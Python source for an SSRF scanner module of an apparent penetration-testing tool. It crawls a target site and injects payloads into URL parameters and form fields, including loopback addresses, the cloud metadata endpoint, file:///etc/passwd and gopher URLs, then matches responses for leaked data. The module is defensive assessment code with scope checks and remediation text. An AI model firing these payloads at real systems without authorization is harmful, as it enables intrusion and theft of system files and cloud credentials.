# AutoPen SSRF Scanner
# Detects Server-Side Request Forgery vulnerabilities
# Tests URL parameters and file path inputs
# Only for authorized testing environments

import requests
import time
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from modules.recon.crawler import WebCrawler

console = Console()

SSRF_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:443/",
    "http://0.0.0.0/",
    "http://192.168.0.1/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/version",
    "dict://127.0.0.1:80/",
    "gopher://127.0.0.1:80/",
]

URL_PARAMETER_NAMES = [
    'url', 'uri', 'link', 'src', 'source',
    'href', 'target', 'dest', 'destination',
    'redirect', 'return', 'next', 'path',
    'file', 'page', 'fetch', 'load',
    'proxy', 'forward', 'image', 'img',
    'data', 'host', 'endpoint', 'site',
    'callback', 'return_url', 'continue',
]

SSRF_SIGNATURES = [
    'root:x:0:0',
    '127.0.0.1 localhost',
    'linux version',
    'apache', 'nginx', 'iis',
    'server: apache',
    'x-powered-by: php',
    'ami-id', 'instance-id',
    'local-hostname',
    'connection refused',
    'no route to host',
    'network unreachable',
]


def is_internal_target(url: str, target_ip: str) -> bool:
    from urllib.parse import urlparse
    try:
        parsed = urlparse(url)
        host = parsed.hostname or ''
        if not host:
            return False
        return host == target_ip or host.endswith(target_ip)
    except Exception:
        return False


class SSRFScanner:
    def __init__(self, config: dict, logger, validator):
        self.target_ip = config['target']['host']
        self.base_url = f"http://{self.target_ip}"
        self.target_url = config['target']['url']
        self.username = config['target'].get('username')
        self.password = config['target'].get('password')
        self.timeout = config['scan']['timeout']
        self.logger = logger
        self.validator = validator
        self.findings = []
        self.tested_params = set()
        self.skip_count = 0
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': config['scan']['user_agent']
        })
        self.config = config

    def run(self, crawl_results=None) -> list:
        console.print(Panel(
            "[bold cyan]PHASE 6: SSRF DETECTION[/bold cyan]\n"
            f"Target: [bold white]{self.target_ip}[/bold white]\n"
            "Testing for Server-Side Request Forgery...",
            style="cyan"
        ))

        if not self.validator.is_host_in_scope(self.target_ip):
            console.print("[bold red]Target out of scope.[/bold red]")
            return []

        # Authentication is handled by the shared session in main.py if provided

        if crawl_results is None:
            console.print("\n[cyan]Crawling for SSRF points...[/cyan]")
            crawler = WebCrawler(self.config, self.logger, self.session)
            crawl_results = crawler.run()
        else:
            console.print("\n[cyan]Using shared crawler results.[/cyan]")

        get_params = crawl_results['get_params']
        forms = crawl_results['forms']

        url_params = [
            p for p in get_params
            if p['param'].lower() in URL_PARAMETER_NAMES
            or self._looks_like_url_param(p['original_value'])
        ]

        url_fields = []
        for form in forms:
            for inp in form['inputs']:
                name = inp.get('name', '').lower()
                value = inp.get('value', '').lower()
                if name in URL_PARAMETER_NAMES or \
                   self._looks_like_url_param(value):
                    url_fields.append({
                        'form': form,
                        'field': inp
                    })

        console.print(
            f"\n[cyan]Found {len(url_params)} URL parameters "
            f"and {len(url_fields)} URL form fields to test[/cyan]"
        )

        if url_params:
            console.print(
                f"\n[cyan]Testing {len(url_params)} "
                f"URL parameters...[/cyan]"
            )
            for param in url_params:
                if not is_internal_target(
                    param['url'], self.target_ip
                ):
                    continue
                self._test_ssrf_get(param['url'], param['param'])

        if url_fields:
            console.print(
                f"\n[cyan]Testing {len(url_fields)} "
                f"form fields...[/cyan]"
            )
            for item in url_fields:
                self._test_ssrf_form(
                    item['form'],
                    item['field']['name']
                )

        # Scans complete
        self._display_results()
        return self.findings

    # DVWA specific methods removed

    def _looks_like_url_param(self, value: str) -> bool:
        value = value.lower()
        return any([
            value.startswith('http'),
            value.startswith('file'),
            value.startswith('/etc'),
            value.startswith('/var'),
            value.endswith('.php'),
            value.endswith('.html'),
            value.endswith('.txt'),
            '/' in value and len(value) > 3,
        ])

    def _test_ssrf_get(self, url: str, param: str):
        param_key = f"{param}"
        if param_key in self.tested_params:
            self.skip_count += 1
            return
        self.tested_params.add(param_key)

        console.print(
            f"\n  [cyan]Testing GET param:[/cyan] "
            f"{param} @ {url[-50:]}"
        )

        try:
            baseline = self.session.get(
                url,
                params={param: 'http://example.com'},
                timeout=self.timeout
            )
            baseline_len = len(baseline.text)
            baseline_time = baseline.elapsed.total_seconds()
        except Exception:
            return

        found = False
        for payload in SSRF_PAYLOADS:
            if found:
                break
            try:
                start = time.time()
                response = self.session.get(
                    url,
                    params={param: payload},
                    timeout=self.timeout
                )
                elapsed = time.time() - start

                self.logger.log_request(
                    'GET', url, response.status_code
                )

                result = self._analyse_response(
                    response, baseline_len,
                    baseline_time, elapsed, payload
                )

                if result:
                    finding = self._create_finding(
                        url=url,
                        parameter=param,
                        payload=payload,
                        method='GET',
                        evidence=result
                    )
                    self.findings.append(finding)
                    self.logger.log_finding('SSRF', url, 'HIGH')
                    console.print(
                        f"  [bold red]✗ SSRF DETECTED![/bold red]\n"
                        f"  [red]Payload:[/red] {payload}\n"
                        f"  [red]Evidence:[/red] {result[:100]}"
                    )
                    found = True

                time.sleep(0.1)

            except requests.exceptions.Timeout:
                console.print(
                    f"  [yellow]⚠ Timeout: {payload}[/yellow]"
                )
            except Exception as e:
                self.logger.log_error('ssrf_get', str(e))

        if not found:
            console.print(f"  [green]✓ No SSRF detected[/green]")

    def _test_ssrf_form(self, form: dict, field_name: str):
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])

        if self.target_ip not in action:
            return

        console.print(
            f"\n  [cyan]Testing form field:[/cyan] "
            f"{field_name} @ {action[-50:]}"
        )

        base_data = {
            i['name']: i.get('value', 'test')
            for i in inputs if i.get('name')
        }

        found = False
        for payload in SSRF_PAYLOADS[:8]:
            if found:
                break
            try:
                test_data = base_data.copy()
                test_data[field_name] = payload

                if method == 'POST':
                    response = self.session.post(
                        action,
                        data=test_data,
                        timeout=self.timeout
                    )
                else:
                    response = self.session.get(
                        action,
                        params=test_data,
                        timeout=self.timeout
                    )

                self.logger.log_request(
                    method, action, response.status_code
                )

                response_lower = response.text.lower()
                for signature in SSRF_SIGNATURES:
                    if signature.lower() in response_lower:
                        finding = self._create_finding(
                            url=action,
                            parameter=field_name,
                            payload=payload,
                            method=method,
                            evidence=(
                                f"SSRF signature: '{signature}'\n"
                                f"Payload: {payload}"
                            )
                        )
                        self.findings.append(finding)
                        self.logger.log_finding(
                            'SSRF', action, 'HIGH'
                        )
                        console.print(
                            f"  [bold red]✗ SSRF DETECTED!"
                            f"[/bold red]\n"
                            f"  [red]Signature:[/red] {signature}"
                        )
                        found = True
                        break

                time.sleep(0.1)

            except Exception as e:
                self.logger.log_error('ssrf_form', str(e))

        if not found:
            console.print(f"  [green]✓ No SSRF detected[/green]")

    # DVWA specific direct tests removed

    def _analyse_response(
        self, response, baseline_len: int,
        baseline_time: float, elapsed: float,
        payload: str
    ) -> str:
        response_lower = response.text.lower()

        for signature in SSRF_SIGNATURES:
            if signature.lower() in response_lower:
                return (
                    f"SSRF content signature: '{signature}'\n"
                    f"Payload: {payload}\n"
                    f"Response length: {len(response.text)} bytes"
                )

        size_diff = abs(len(response.text) - baseline_len)
        if size_diff > 500 and len(response.text) > 100:
            if any(sig in response_lower for sig in [
                'apache', 'php', 'mysql', 'root',
                'localhost', '127.0.0.1'
            ]):
                return (
                    f"Significant response change.\n"
                    f"Baseline: {baseline_len} bytes\n"
                    f"Response: {len(response.text)} bytes\n"
                    f"Difference: {size_diff} bytes\n"
                    f"Payload: {payload}"
                )

        return None

    def _create_finding(
        self, url: str, parameter: str,
        payload: str, method: str, evidence: str
    ) -> dict:
        if payload.startswith('file://') or \
           payload.startswith('/etc') or \
           payload.startswith('....//'):
            vuln_type = 'Local File Inclusion (LFI)'
            title = f"LFI in parameter '{parameter}'"
            description = (
                f"Local File Inclusion in '{parameter}'. "
                "Server includes local files based on user input."
            )
            remediation = (
                "1. Never use user input in file include.\n"
                "2. Use whitelist of allowed file names.\n"
                "3. Store files outside web root.\n"
                "4. Disable allow_url_include in php.ini.\n"
                "5. Implement input validation."
            )
            cvss_score = 8.6
            cvss_vector = (
                'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N'
            )
            references = [
                'CWE-22: Path Traversal',
                'CWE-98: Improper Control of Filename for Include'
            ]
        else:
            vuln_type = 'Server-Side Request Forgery (SSRF)'
            title = f"SSRF in parameter '{parameter}'"
            description = (
                f"SSRF detected in '{parameter}'. "
                "Server fetches URLs supplied by user input."
            )
            remediation = (
                "1. Validate and sanitize all URL inputs.\n"
                "2. Use allowlist of permitted domains.\n"
                "3. Block requests to internal IP ranges.\n"
                "4. Disable unused URL schemes.\n"
                "5. Implement network-level controls."
            )
            cvss_score = 8.6
            cvss_vector = (
                'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N'
            )
            references = [
                'https://owasp.org/www-community/attacks/SSRF',
                'CWE-918: Server-Side Request Forgery'
            ]

        return {
            'title': title,
            'type': 'ssrf',
            'vuln_type': vuln_type,
            'target': url,
            'parameter': parameter,
            'payload': payload,
            'severity': 'HIGH',
            'cvss_score': cvss_score,
            'cvss_vector': cvss_vector,
            'description': description,
            'evidence': evidence,
            'remediation': remediation,
            'references': references,
            'discovered_at': datetime.now().isoformat()
        }

    def _display_results(self):
        console.print(
            f"\n[bold white]SSRF Scan Complete.[/bold white]"
        )

        if self.skip_count > 0:
            console.print(
                f"[yellow]Skipped {self.skip_count} duplicate "
                f"parameters (already tested)[/yellow]"
            )

        if not self.findings:
            console.print(
                "[bold green]✓ No SSRF vulnerabilities "
                "found.[/bold green]"
            )
            return

        table = Table(
            title="SSRF Findings",
            box=box.ROUNDED,
            style="cyan"
        )
        table.add_column("Type", style="bold white", width=30)
        table.add_column("Parameter", style="cyan", width=15)
        table.add_column("Severity", style="bold red", width=10)
        table.add_column("CVSS", style="bold", width=6)

        for f in self.findings:
            table.add_row(
                f['vuln_type'],
                f['parameter'],
                f['severity'],
                str(f['cvss_score'])
            )

        console.print(table)
        console.print(
            f"[bold cyan]Total SSRF Findings: "
            f"{len(self.findings)}[/bold cyan]"
        )
